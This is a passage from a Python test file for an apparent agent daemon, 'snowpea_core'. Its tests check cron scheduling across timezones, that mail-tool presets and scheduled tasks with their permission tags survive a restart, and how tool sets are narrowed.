        ][0]["done"]
    finally:
        await daemon.stop()


def test_a_scheduler_job_reads_its_cron_in_its_timezone() -> None:
    from snowpea_core.scheduler.nl_parse import next_run, parse_spec

    now = utc_now().replace(hour=12, minute=0, second=0, microsecond=0)
    spec = parse_spec("0 9 * * *")
    from dataclasses import replace

    seoul = next_run(replace(spec, tz="Asia/Seoul"), now)
    assert seoul is not None and seoul.hour == 0
    tokyo_nyc = next_run(replace(spec, tz="America/New_York"), now)
    assert tokyo_nyc is not None and tokyo_nyc.hour in (13, 14)


# -- restart ---------------------------------------------------------------------------------


async def test_presets_and_tasks_survive_a_restart(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    log = tmp_path / "mail.log"
    daemon = await _daemon(tmp_path)
    try:
        client = await connect(http, daemon)
        applied = await client.ok("mcp.preset.apply", _apply_params(log, recipes=["mail-digest"]))
        made = await _jcall(
            daemon.core,
            "schedule_create",
            {"spec": "0 9 * * 1", "task": "Weekly review", "timezone": "Asia/Seoul"},
        )
        task_id = made.meta["id"]
    finally:
        await daemon.stop()

    daemon = await make_daemon(tmp_path / "home")
    daemon.core.providers.get = lambda _p, _m: _Provider()
    try:
        core = daemon.core
        client = await connect(http, daemon)
        listed = (await client.ok("mcp.preset.list", {}))["presets"]
        assert next(p for p in listed if p["id"] == "fakemail")["applied"] is True
        # The server came back at boot with the same tags.
        await _wait(lambda: core.tools.get("mcp__fakemail-mail__search_threads") is not None)
        assert core.tools.get("mcp__fakemail-mail__search_threads").permission == "read"
        assert core.tools.get("mcp__fakemail-mail__send_mail").permission == "send"
        # The jobs kept their target, data and timezone.
        digest = await core.scheduler.get(applied["jobs"][0])
        assert digest.target == "jarvis-task" and digest.target_data["kind"] == "mail"
        task = await core.scheduler.get(task_id)
        assert task.target_data["kind"] == "task" and task.timezone == "Asia/Seoul"
        assert (await _jcall(core, "schedule_list", {})).output.count("\n") == 1
        # Same apply: still nothing to do; then it can be taken off.
        again = await client.ok("mcp.preset.apply", _apply_params(log, recipes=["mail-digest"]))
        assert again["already"] is True
        assert (await client.ok("mcp.preset.remove", {"id": "fakemail"}))["removed"] is True
    finally:
        await daemon.stop()


def test_exclusive_tools_are_not_widened() -> None:
    from types import SimpleNamespace

    from snowpea_core.tools import deferred

    plain = SimpleNamespace(exclusive_tools=False, is_subagent=False)
    only = SimpleNamespace(exclusive_tools=True, is_subagent=False)
    assert "read_file" in deferred.narrowed({"a"}, plain)
    assert deferred.narrowed({"a"}, only) == {"a"}
    assert deferred.narrowed({"a"}) >= {"a", "read_file", "tool_search"}
